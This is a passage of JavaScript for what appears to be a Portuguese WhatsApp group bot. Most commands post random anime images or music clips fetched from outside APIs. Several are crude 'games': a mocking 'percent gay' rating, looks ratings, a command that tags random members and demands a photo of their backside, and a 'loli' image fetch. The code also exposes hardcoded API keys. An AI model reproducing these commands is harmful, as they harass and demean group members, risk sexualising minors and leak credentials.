res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'hinata':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=hinata%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'sakura':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=sakura%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'madara':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=madara%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'zerotwo':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=zerotwo%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'ichigo':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=ichigo%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'spike':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=spike%20spiegel%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'julia':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=julia%20cowboy%20bebop%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'faye':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=faye%20valentine%20spiegel%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'amv':
				 data = await getBuffer(`https://pastebin.com/raw/J31uLxv6`);
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/mp4', quoted: mek})
				break
case 'bunnygirl':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=bunnygirl%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'itachi':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=itachi%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'mikasa':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=Mikasa%20Ackermann&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'luffy':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=luffy&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'zoro':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=zoro%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'nami':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=nami%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'miku':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=miku&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'nezuko':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=nezuko&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'levi':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=levi%20Ackerman&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'edward':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=edward%20elric&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'winry':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=winry%20rockbell&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'akame':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=akame&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'esdeath':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=esdeath&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'icon':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=anime%20icon&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break

case 'filo':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=filo%20shield%20hero&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'naofumi':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=naofumi&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'tanjiro':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=tanjiro%20kamado&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case'loli':
  lolikkk = await getBuffer(`http://hadi-api.herokuapp.com/api/loli`)
  edward.sendMessage(from, lolikkk, image ,{quoted: mek})
  break
case'wallpaperanime':
  vu = await getBuffer(`https://hardianto.xyz/api/anime/random?sfw=wallpaper&apikey=hardianto`)
  edward.sendMessage(from, vu, image, {quoted: mek})
  break
//////musicas//////
case 'fvmz':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=vmzofical&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `🪐`,`@vmzoficial`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break

case 'fchainz':
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=kamaitachi&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break
case 'vmz':
				 data = fs.readFileSync('./arquivos/mp3/vmz.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
case 'lilchainz':
				 data = fs.readFileSync('./arquivos/mp3/lilchainz.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
case 'magyn':
			
				 data = fs.readFileSync('./arquivos/mp3/magyn.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
case 'mikezin':
			
				 data = fs.readFileSync('./arquivos/mp3/mikezin.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
/*
case 'mhrap':
			
				 data = fs.readFileSync('./arquivos/mp3/magyn.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break*/ 
case 'pinterest':
edward.updatePresence(from, Presence.composing)


if (args.length < 1) return reply(`O que voce deseja buscar?`)
tekis = body.slice(10)
anu = await fetchJson(`https://akame-api.herokuapp.com/api/pinterest?nome=${tekis}&apikey=edwardbot22`)
res = anu.resultado
random =  res[Math.floor(Math.random() * res.length)]
pinter = await getBuffer(random)
//edward.sendMessage(from, await getBuffer(random), image, {quoted: mek})
sendButImage(from, `Aqui está :)`,`@bruno`, pinter,[{buttonId: `${command} ${tekis}`, buttonText: {displayText: '🌀PRÓXIMA ♻️'}, type: 1}], {quoted:mek})
break

case 'fkamaitachi':
			
				 data = await fetchJson(`https://pastebin.com/raw/RUJ22i4V`);
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.image, {quoted: mek})
				break
case 'thefox':
			
				 data = fs.readFileSync('./arquivos/mp3/thefox.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
case 'dri':
			
				 data = fs.readFileSync('./arquivos/mp3/dri.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
case 'nanasai':
			
				 data = fs.readFileSync('./arquivos/mp3/nanasai.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.audio, {mimetype: 'audio/mp4', quoted: mek})
				break
case'lyric':
  if (args.length === 0 ) return reply(`Qual o nome da Musica? ex: ${prefix}lyric kamaitachi julieta`)
  msc = body.slice(6)
  liri = await fetchJson(`https://raku-web.herokuapp.com/api/music/liriklagu?query=${msc}&apikey=RakuKeyTod`)
  musik = `RESULTADO:\n\n ${liri.result}`
  edward.sendMessage(from, musik, text, {quoted: mek})
  break
//////////////////
case 'gay':
random = `${Math.floor(Math.random() * 100)}`
boiola = random
wew = fs.readFileSync(`./arquivos/gay.jpg`)
if (boiola < 20) {bo = 'hmm... você é hetero 😔'} else if (boiola == 21 ) {bo = '+/- boiola'} else if (boiola == 23 ) {bo = '+/- boiola'} else if (boiola == 24 ) {bo = '+/- boiola'} else if (boiola == 25 ) {bo = '+/- boiola'} else if (boiola == 26 ) {bo = '+/- boiola'} else if (boiola == 27 ) {bo = '+/- boiola'} else if (boiola == 28 ) {bo = '+/- boiola'} else if (boiola == 29 ) {bo = '+/- boiola'} else if (boiola == 30 ) {bo = '+/- boiola'} else if (boiola == 31 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 32 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 33 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 34 ) {bo = 'tenho minha desconfiança...😑'}else if (boiola == 35 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 36 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 37 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 38 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 39 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 40 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 41 ) {bo = 'você é né?😏'} else if (boiola == 42 ) {bo = 'você é né?😏'} else if (boiola == 43 ) {bo = 'você é né?😏'} else if (boiola == 44 ) {bo = 'você é né?😏'} else if (boiola == 45 ) {bo = 'você é né?😏'} else if (boiola == 46 ) {bo = 'você é né?😏'} else if (boiola == 47 ) {bo = 'você é né???'} else if (boiola == 48 ) {bo = 'você é né?😏'} else if (boiola == 49 ) {bo = 'você é né?😏'} else if (boiola == 50 ) {bo = 'você é ou não?🧐'} else if (boiola > 51) {bo = 'você é gay🙈'}
teks = `Você é ${random}% Gay\n\n${bo}`
edward.sendMessage(from, wew, image, {quoted: mek, caption: teks})
break
case 'gostosa':
random = `${Math.floor(Math.random() * 100)}`
boiola = random
wew = fs.readFileSync(`./arquivos/gostosa.jpg`)
if (boiola < 20) {bo = 'Você é uma tabuaKKKKKKKKKKKKK'} else if (boiola == 21 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 23 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 24 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 25 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 26 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 27 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 28 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 29 ) {bo = 'mt feikkkkkkkkkkk'} else if (boiola == 30 ) {bo = 'Palito de picolékkkkkkkkk'} else if (boiola == 31 ) {bo = 'você é aceitável 🧐'} else if (boiola == 32 ) {bo = 'você é aceitável 🧐'} else if (boiola == 33 ) {bo = 'você é aceitável 🧐'} else if (boiola == 34 ) {bo = 'você é aceitável 🧐'}else if (boiola == 35 ) {bo = 'você é aceitável 🧐'} else if (boiola == 36 ) {bo = 'você é aceitável 🧐'} else if (boiola == 37 ) {bo = 'você é aceitável 🧐'} else if (boiola == 38 ) {bo = 'você é aceitável 🧐'} else if (boiola == 39 ) {bo = 'você é aceitável 🧐'} else if (boiola == 40 ) {bo = 'você é aceitável 🧐'} else if (boiola == 41 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 42 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 43 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 44 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 45 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 46 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 47 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 48 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 49 ) {bo = 'eu pegava 😳😳😳'} else if (boiola == 50 ) {bo = 'GOSTOSAKKKKKKKKKKKK'} else if (boiola == 51) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 52) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 53) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 54) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 55) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 56) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 57) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 58) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 59) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 60) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 61) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 62) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 63) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 64) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 65) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 66) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 67) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola == 68) {bo = 'Eita q  gostosakkkkkkkkk 😳'} else if (boiola > 69) {bo = 'quanta gostosura😳'}
teks = `Você é ${random}% Gostosa\n\n${bo}`
edward.sendMessage(from, wew, image, {quoted: mek, caption: teks})
break
case 'linda':
random = `${Math.floor(Math.random() * 100)}`
boiola = random
wew = fs.readFileSync(`./arquivos/linda.jpeg`)
if (boiola < 20) {bo = 'ESPELHO QUEBROUKKKKKKKKKKKKK'} else if (boiola == 21 ) {bo = 'fionakkk'} else if (boiola == 23 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 24 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 25 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 26 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 27 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 28 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 29 ) {bo = 'mt feikkkkkkkkkkk'} else if (boiola == 30 ) {bo = 'Dragãokkkkkkkkk'} else if (boiola == 31 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 32 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 33 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 34 ) {bo = 'Melhor que nada 🧐'}else if (boiola == 35 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 36 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 37 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 38 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 39 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 40 ) {bo = 'Melhor que nada 🧐'} else if (boiola == 41 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 42 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 43 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 44 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 45 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 46 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 47 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 48 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 49 ) {bo = 'Bonitinha você 😳😳😳'} else if (boiola == 50 ) {bo = 'GOSTOSAKKKKKKKKKKKK'} else if (boiola == 51) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 52) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 53) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 54) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 55) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 56) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 57) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 58) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 59) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 60) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 61) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 62) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 63) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 64) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 65) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 66) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 67) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola == 68) {bo = 'quer me manipular ss ou nn ? 😡'} else if (boiola > 69) {bo = 'bó casa?😳'}
teks = `Você é ${random}% linda\n\n${bo}`
edward.sendMessage(from, wew, image, {quoted: mek, caption: teks})
break
case 'roleta':
const tiro = ["vazio","vazio","vazio","vazio","vazio","vazio","vazio","vazio","pow","pow"]
const figr = ["roleta1","roleta2","roleta3"]
tpa = tiro[Math.floor(Math.random() * (tiro.length))]	
tpb = figr[Math.floor(Math.random() * (figr.length))]
figb = fs.readFileSync('./arquivos/'+tpb+'.webp')
if (tpa == "vazio") {
var morte = "Você teve sorte dessa vez, o tambor estava vazio."
} else if (tpa == "pow") {
var morte = "Tinha uma bala no tambor, POW!"
}
if (morte == "Tinha uma bala no tambor, POW!") {
setTimeout( () => {
edward.sendMessage(from, figb, sticker, {quoted: mek})
}, 2100)
}
setTimeout( () => {
edward.sendMessage(from, morte, text, {quoted: mek})
}, 2300)
break
case 'detectordegostosa':
 if (!isGroup) return reply(mess.only.group)
membro = []
const mett1 = groupMembers
const msdd1 = groupMembers
const siapsasa = mett1[Math.floor(Math.random() * mett1.length)]
const siapsasa2 = mett1[Math.floor(Math.random() * mett1.length)]
const sipssda1 = pushname[Math.floor(Math.random() * msdd1.length)]
cuzin = `*ＤＥＴＥＣＴＯＲ ＤＥＧＯＳＴＯＳＡＳ👩‍⚕️*\n\n*pipipipi🚨🚨🚨pipipipi🚨🚨🚨pipipipi🚨🚨🚨*\n\n @${siapsasa.jid.split('@')[0]} @${siapsasa2.jid.split('@')[0]} *PARADA(O)S AÍ🖐*\n\n*VOCÊ ACABA DE RECEBER UMA MULTA POR EXCEDER O LIMITE DE GOSTOSURAKKKKKK*\n\n*VALOR DA MULTA:*\n*FOTO DA RABA NO PV kkkkk*`
membro.push(siapsasa.jid)
membro.push(siapsasa2.jid)
mentions(cuzin, membro, true) 
 break
case 'abraço':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus =
`Que fofo...💘 você deu um abraço em @${mentioned[0].split('@')[0]}`
mentions(sus, mentioned, true)
data = fs.readFileSync('./arquivos/interação/abraço.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/gif', quoted: mek})
break
case 'ship':
if (!isGroup) return reply(mess.group)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém') 
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
porc = `${Math.floor(Math.random() * 100)}`
wew = fs.readFileSync('./arquivos/ship.jpg')
yhb =  `segundo meus cálculos, a chance de ambos namorarem é de ${porc}%`,
edward.sendMessage(from,wew, image, {quoted: mek, caption: yhb})
break
case 'tapanaraba':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus = `😳 você deu um tapa na raba de @${mentioned[0].split('@')[0]}`
 mentions(sus, mentioned, true)
data = fs.readFileSync('./arquivos/interação/tapab.js');
 jsonData = JSON.parse(data);
